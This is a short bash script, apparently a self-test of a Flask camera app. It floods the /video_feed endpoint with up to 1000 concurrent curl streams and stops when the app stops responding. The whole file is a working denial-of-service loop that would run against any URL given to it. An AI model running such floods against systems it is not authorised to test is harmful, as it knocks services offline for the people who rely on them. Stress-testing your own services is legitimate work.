#!/bin/bash

# Check if camera URL argument is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <camera_base_url>"
    echo "Example: $0 http://10.42.0.42:37243"
    exit 1
fi

CAMERA_BASE="$1"
TARGET="${CAMERA_BASE}/video_feed"
MAX_STREAMS=1000     # Max limit just in case
CHECK_URL="$CAMERA_BASE"
SLEEP_TIME=1         # Seconds between health checks
PIDS=()

echo "Starting DoS test on $TARGET"
echo "Health check URL: $CHECK_URL"

for ((i=1; i<=MAX_STREAMS; i++)); do
  curl -s "$TARGET" > /dev/null &
  PIDS+=($!)

  echo "Spawned stream #$i"

  sleep 0.2  # Slight delay between spawns to observe system limits

  # Health check (does Flask still respond?)
  if ! curl -s --connect-timeout 1 "$CHECK_URL" > /dev/null; then
    echo "❌ Camera app stopped responding after $i streams."
    break
  fi
done

# Cleanup
echo "🔪 Killing all spawned curl processes..."
for pid in "${PIDS[@]}"; do
  kill "$pid" 2>/dev/null
done

echo "✅ Test complete."

